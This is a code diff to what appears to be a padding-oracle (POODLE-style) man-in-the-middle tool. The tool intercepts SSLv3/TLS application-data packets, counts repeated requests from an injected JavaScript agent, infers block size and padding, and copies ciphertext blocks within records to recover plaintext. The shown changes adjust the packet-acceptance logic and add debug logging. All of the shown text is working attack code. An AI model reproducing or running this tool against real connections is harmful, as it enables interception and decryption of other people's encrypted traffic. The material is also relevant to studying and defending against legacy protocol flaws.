@@ -218,7 +218,12 @@ with output(output_type='list', initial_len=6) as output_list:
 			sessions[src_port] = session
 
 			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
+
+				# Need to make sure that the packets are sent by our JS agent, and one thing our JS agent does is send the same packets over and over...
 				request_length_count[len(pkt)] = request_length_count[len(pkt)] + 1 if len(pkt) in request_length_count else 0
+				if request_length_count[len(pkt)] < 5:
+					packet.accept()
+					return
 
 				# Don't modify pre-flight check
 				if config["skipOptions"] and (option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length)):
@@ -229,17 +234,13 @@ with output(output_type='list', initial_len=6) as output_list:
 					packet.accept()
 					return
 				elif post_request_length is None:
-					if request_length_count[len(pkt)] > 4:
-						log("POST Request Length: " + str(len(pkt)))
-						post_request_length = len(pkt)
-					else:
-						packet.accept()
-						return
+					log("POST Request Length: " + str(len(pkt)))
+					post_request_length = len(pkt)
 
 				# Stage 1: The JS client is sending packets of increasing length
 				if block_size is None:
 
-					if request_length_count[len(pkt)]:
+					if request_length_count[len(pkt)] > 4:
 						log("Got request length " + str(len(pkt)))
 						if ciphertext_length > 0:
 							data_padding_size_needed += 1
@@ -269,6 +270,8 @@ with output(output_type='list', initial_len=6) as output_list:
 					tls_data_start_index = ([i + 5 for i in range(len(bytes(pkt))) if list(bytes(pkt))[i:i+3] == [0x17, 0x03, 0x00]])[-1]
 
 					session.ciphertext = bytes(pkt)[tls_data_start_index:]
+					log("tls_data_start_index: " + str(tls_data_start_index))
+					log("start_index: " + str(start_index))
 
 					new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
 					session.block = new_bytes[-block_size:]
